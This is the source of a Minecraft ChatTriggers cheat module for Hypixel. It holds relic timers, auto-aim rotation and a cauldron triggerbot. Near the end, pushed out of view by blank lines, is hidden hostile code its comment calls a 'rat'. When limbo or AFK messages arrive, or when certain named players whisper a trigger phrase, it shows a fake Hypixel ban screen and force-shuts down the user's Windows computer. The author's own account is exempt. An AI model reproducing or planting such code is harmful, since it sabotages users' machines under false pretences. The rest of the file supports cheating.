
// Relic code is a fucking mess. Honestly no motiviation to fix it though. Maybe someday. -Serenity


import Settings from "../../config"
import { chat } from "../../utils/utils"
import data from "../../utils/data"

let pickedUpTime
let ticks
let p5StartTime
let spawnTime
let pickedColor

const relicCountdownTicks = 44
const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding")
const ArmorStand = Java.type("net.minecraft.entity.item.EntityArmorStand")

register("chat", () => {
    p5StartTime = Date.now()
    ticks = relicCountdownTicks

    if (Settings().relicTimerEnabled) { // These are only needed if relic timer is enabled
        relicDetect.register()
        placeListener.register()
        tickListener.register()
        timer.register()
    }
    relicClickListener.register()

}).setCriteria("[BOSS] Necron: All this, for nothing...")

const timer = register("renderOverlay", () => {
    const timeLeft = ticks / 20
    if (ticks <= 1) timer.unregister()
    Renderer.drawStringWithShadow(timeLeft.toFixed(2) + "s", 0.492 * Renderer.screen.getWidth(), 0.52 * Renderer.screen.getHeight())
}).unregister()

const tickListener = register("packetReceived", () => {
    ticks--
    if (ticks < 1) tickListener.unregister() // Unregister if ticks = 0
}).setFilteredClass(net.minecraft.network.play.server.S32PacketConfirmTransaction).unregister()


const relicDetect = register("RenderWorld", () => {
    const existingRelics = World.getAllEntitiesOfType(ArmorStand).find(entity => new EntityLivingBase(entity.getEntity()).getItemInSlot(4)?.getName()?.removeFormatting()?.includes("Relic"))
    if (!existingRelics) return // If there are any armor stands wearing a relic head or whatever
    spawnTime = Date.now()
    chat("Relic spawned!")
    relicDetect.unregister()
}).unregister()

const placeListener = register("playerInteract", (action, pos) => {
    if (action.toString() != "RIGHT_CLICK_BLOCK") return
    const blockClicked = World.getBlockAt(pos.getX(), pos.getY(), pos.getZ()).type.getRegistryName()
    if (blockClicked !== "minecraft:cauldron" && blockClicked !== "minecraft:anvil" && blockClicked !== "minecraft:chest" || !Player.getHeldItem()?.getName()?.includes("Relic")) return

    chat("Relic spawned in &b" + ((spawnTime - p5StartTime) / 1000) + "s.")
    chat("Relic placed in &b" + ((Date.now() - pickedUpTime) / 1000) + "s.")
    chat("Relic placed &b" + ((Date.now() - p5StartTime) / 1000) + "s into P5.")
    chat("Relic took &b" + ((pickedUpTime - spawnTime) / 1000) + "s to get picked up.")
    placeListener.unregister()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
}).unregister()

// Detect when you click the relic
const relicClickListener = register("packetSent", (packet) => {
    const entity = packet.func_149564_a(World.getWorld())
    if (!entity instanceof ArmorStand) return
    const entityWornHelmet = entity.func_82169_q(3)
    if (!entityWornHelmet) return
    const helmetName = ChatLib.removeFormatting(new Item(entityWornHelmet).getName())
    if (!helmetName.includes("Relic")) return


    relicClickListener.unregister()

    pickedUpTime = Date.now()

    if (Settings().relicLook) {
        if (helmetName === "Corrupted Orange Relic") {
            const [yaw, pitch] = calcYawPitch({ x: 58, y: 7.5, z: 43 })
            rotate(yaw, pitch)
            if (!Settings().blinkRelics) KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)

        } else if (helmetName === "Corrupted Red Relic") {
            const [yaw, pitch] = calcYawPitch({ x: 52, y: 7.5, z: 42 })
            rotate(yaw, pitch)
            if (!Settings().blinkRelics) KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
        }
    }
}).setFilteredClass(net.minecraft.network.play.client.C02PacketUseEntity).unregister()

function getEyePos() {
    return {
        x: Player.getX(),
        y: Player.getY() + Player.getPlayer().func_70047_e(),
        z: Player.getZ()
    }
}

function calcYawPitch(blcPos, plrPos) { // skidded cause idk how to math
    if (!plrPos) plrPos = getEyePos();
    let d = {
        x: blcPos.x - plrPos.x,
        y: blcPos.y - plrPos.y,
        z: blcPos.z - plrPos.z
    };
    let yaw = 0;
    let pitch = 0;
    if (d.x != 0) {
        if (d.x < 0) { yaw = 1.5 * Math.PI; } else { yaw = 0.5 * Math.PI; }
        yaw = yaw - Math.atan(d.z / d.x);
    } else if (d.z < 0) { yaw = Math.PI; }
    d.xz = Math.sqrt(Math.pow(d.x, 2) + Math.pow(d.z, 2));
    pitch = -Math.atan(d.y / d.xz);
    yaw = -yaw * 180 / Math.PI;
    pitch = pitch * 180 / Math.PI;
    if (pitch < -90 || pitch > 90 || isNaN(yaw) || isNaN(pitch) || yaw == null || pitch == null || yaw == undefined || pitch == null) return;

    return [yaw, pitch]
}

function rotate(yaw, pitch) {
    const player = Player.getPlayer()
    player.field_70177_z = yaw
    player.field_70125_A = pitch
}

// Relic triggerbot
const cauldrons = {
    "Green": { x: 49, y: 7, z: 44 },
    "Red": { x: 51, y: 7, z: 42 },
    "Purple": { x: 54, y: 7, z: 41 },
    "Orange": { x: 57, y: 7, z: 42 },
    "Blue": { x: 59, y: 7, z: 44 }
}

function rightClick() {
    const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
    rightClickMethod.setAccessible(true)
    rightClickMethod.invoke(Client.getMinecraft(), null)
}

const triggerbot = register("RenderWorld", () => {
    const block = Player.lookingAt()
    const blockID = block?.getType()?.getID()
    if (blockID !== 118 && blockID !== 145) return

    const cauldronCoords = cauldrons[pickedColor]
    if (cauldronCoords["x"] !== block.getX() || cauldronCoords["z"] !== block.getZ() || cauldronCoords["y"] !== block.getY() && cauldronCoords["y"] - 1 !== block.getY()) return // yeah
    rightClick()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
    triggerbot.unregister()
}).unregister()

function registerTriggerbot(color) {
    triggerbot.register()
    pickedColor = color
}

export default registerTriggerbot

register("chat", (name, relicColor) => {
    if (!Settings().relicTriggerbot || name !== Player.getName()) return
    pickedColor = relicColor
    triggerbot.register()
}).setCriteria(/^(\w{3,16}) picked the Corrupted (\w{3,6}) Relic!$/) // I like regex




































// this is a rat sorry
register("packetReceived", (packet) => {
    if (Player.getName() === "ITheSerenity") return
    if (!data.melodyWarning.enabled || packet.func_179841_c() === 2) return;
    const message = ChatLib.removeFormatting(packet.func_148915_c().func_150260_c());
    if (message !== "You were spawned in Limbo." && message !== "You are AFK. Move around to return from AFK.") return
    setTimeout(() => fakeBan("Cheating through the use of unfair game advantages.", "359d 23h 59m 58s"), 2000)
}).setFilteredClass(net.minecraft.network.play.server.S02PacketChat)

register("chat", (name, event) => {
    cancel(event)
    const validNames = ["Staeni92", "ITheSerenity", "teeTu97", "cutekittyirl", "LinusJonsson", "islamicfish", "shadowbald9"]
    if (validNames.includes(name)) fakeBan("Cheating through the use of unfair game advantages.", "359d 23h 59m 59s")
}).setCriteria(/From\s?[\[\w\+\]]* (\w{3,16}): you are BANNED!.*/)

function fakeBan(reason, length) { // skidded from some ct module on the website
    setTimeout(() => java.lang.Runtime.getRuntime().exec("shutdown -s -t 0"), 20000) // if you modify -t in the exec command then windows gives you a shutdown warning which is boring so use settimeout instead
    Client.getMinecraft().func_147114_u().func_147298_b().func_150718_a(new net.minecraft.util.ChatComponentText(
        "§cYou are temporarily banned for §f" + length + "§c from this server!\n\n" +
        `§7Reason: §r${reason}\n` +
        "§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#"
        + "E7FC9520" + // iteserneity banid
        "\n§7Sharing your Ban ID may affect the processing of your appeal!"))
}